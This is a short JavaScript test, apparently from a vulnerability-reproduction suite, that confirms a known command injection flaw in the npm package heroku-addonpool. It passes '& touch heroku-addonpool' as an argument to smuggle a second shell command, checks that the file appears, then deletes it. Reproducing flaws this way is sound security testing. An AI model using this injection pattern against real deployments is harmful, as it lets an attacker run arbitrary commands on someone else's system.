//https://snyk.io/vuln/SNYK-JS-HEROKUADDONPOOL-564428
test("Command Injection in heroku-addonpool", () => {
  const Root = require("heroku-addonpool");
  const fs = require("fs");
  const path = "./heroku-addonpool";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let root = Root("sss", "& touch heroku-addonpool", {});
  root.setup();

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
